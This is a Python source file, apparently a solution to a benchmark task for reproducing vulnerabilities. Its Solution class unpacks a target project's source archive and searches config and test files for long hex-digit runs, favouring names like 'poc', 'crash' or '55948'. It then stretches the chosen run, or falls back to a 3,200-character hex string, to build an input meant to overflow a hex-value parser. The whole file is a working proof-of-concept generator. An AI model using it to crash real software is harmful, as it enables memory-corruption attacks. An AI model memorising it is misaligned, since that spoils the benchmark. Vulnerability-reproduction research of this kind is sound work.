import os
import tarfile
import tempfile
import shutil
import stat


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            self._extract_tar(src_path, tmpdir)
            data, start, run_len = self._pick_config_template(tmpdir)
            if data is not None and run_len > 0:
                if (len(data) == 547 and run_len >= 100) or run_len >= 1024:
                    return data
                mutated = self._mutate_hex_run(data, start, run_len)
                if mutated is not None:
                    return mutated
                return data
            return self._generic_poc()
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    def _extract_tar(self, tar_path: str, dest_dir: str) -> None:
        with tarfile.open(tar_path, "r:*") as tf:
            for member in tf.getmembers():
                name = member.name
                if not name:
                    continue
                if name.startswith("/"):
                    continue
                parts = name.split("/")
                if any(part == ".." for part in parts):
                    continue
                try:
                    tf.extract(member, dest_dir)
                except (tarfile.ExtractError, OSError):
                    continue

    def _is_text_file(self, data: bytes) -> bool:
        if not data:
            return False
        sample = data[:4096]
        if b"\0" in sample:
            return False
        return True

    def _find_longest_hex_run(self, data: bytes):
        best_len = 0
        best_start = -1
        cur_len = 0
        cur_start = 0
        for i, b in enumerate(data):
            if (48 <= b <= 57) or (65 <= b <= 70) or (97 <= b <= 102):
                if cur_len == 0:
                    cur_start = i
                cur_len += 1
                if cur_len > best_len:
                    best_len = cur_len
                    best_start = cur_start
            else:
                cur_len = 0
        if best_start < 0:
            best_start = 0
        return best_start, best_len

    def _pick_config_template(self, root_dir: str, target_poc_size: int = 547):
        config_exts = {
            ".conf", ".cfg", ".cnf", ".ini", ".toml", ".json", ".xml",
            ".yaml", ".yml", ".txt", ".config", ".sample", ".test",
            ".cfg.in", ".properties"
        }
        best_overall = None
        best_overall_score = -1
        size_target_candidates = []

        for dirpath, _, filenames in os.walk(root_dir):
            for fname in filenames:
                path = os.path.join(dirpath, fname)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue
                if st.st_size == 0 or st.st_size > 1024 * 1024:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                if not self._is_text_file(data):
                    continue

                name_lower = fname.lower()
                path_lower = path.lower()
                ext = os.path.splitext(name_lower)[1]

                is_candidate = False
                if ext in config_exts:
                    is_candidate = True
                if any(k in name_lower for k in ("conf", "config", "cfg", "hex", "poc", "case", "input", "sample", "overflow", "bug", "crash", "regress")):
                    is_candidate = True
                if any(seg in path_lower for seg in ("/tests", "/test", "/examples", "/example", "/inputs", "/cases", "/poc", "/regress")):
                    if ext not in (".c", ".cpp", ".cc", ".h", ".hpp", ".py", ".sh", ".md", ".rst", ".html", ".js", ".java"):
                        is_candidate = True
                if not is_candidate:
                    continue

                start, run_len = self._find_longest_hex_run(data)
                if run_len == 0:
                    continue

                bonus = 0
                if "poc" in name_lower or "overflow" in name_lower or "crash" in name_lower:
                    bonus += 100
                if "hex" in name_lower:
                    bonus += 40
                if "bug" in name_lower or "issue" in name_lower:
                    bonus += 20
                if "55948" in name_lower or "55948" in path_lower:
                    bonus += 80
                if ext in (".conf", ".cfg", ".cnf", ".ini", ".config"):
                    bonus += 30
                if any(seg in path_lower for seg in ("/tests", "/test", "/regress")):
                    bonus += 10

                score = run_len * 1000 + bonus - st.st_size // 10
                candidate = (score, path, data, start, run_len)

                if st.st_size == target_poc_size:
                    size_target_candidates.append(candidate)

                if score > best_overall_score:
                    best_overall_score = score
                    best_overall = candidate

        chosen = None
        if size_target_candidates:
            size_target_candidates.sort(key=lambda x: x[0], reverse=True)
            chosen = size_target_candidates[0]
        else:
            chosen = best_overall

        if not chosen:
            return None, 0, 0

        _, _, data, start, run_len = chosen
        return data, start, run_len

    def _mutate_hex_run(self, data: bytes, start: int, run_len: int) -> bytes:
        if run_len <= 0 or start < 0 or start >= len(data):
            return None
        if run_len >= 1024:
            target_run_len = run_len
        else:
            target_run_len = max(600, run_len * 4)
            if target_run_len > 4096:
                target_run_len = 4096

        hex_seq = data[start:start + run_len]
        if not hex_seq:
            return None
        repeat = target_run_len // max(1, run_len) + 1
        new_hex = (hex_seq * repeat)[:target_run_len]
        prefix = data[:start]
        suffix = data[start + run_len:]
        return prefix + new_hex + suffix

    def _generic_poc(self) -> bytes:
        base = b"0123456789abcdef"
        long_hex = base * 200
        poc = b"key=" + long_hex + b"\n" + b"value 0x" + long_hex + b"\n"
        return poc
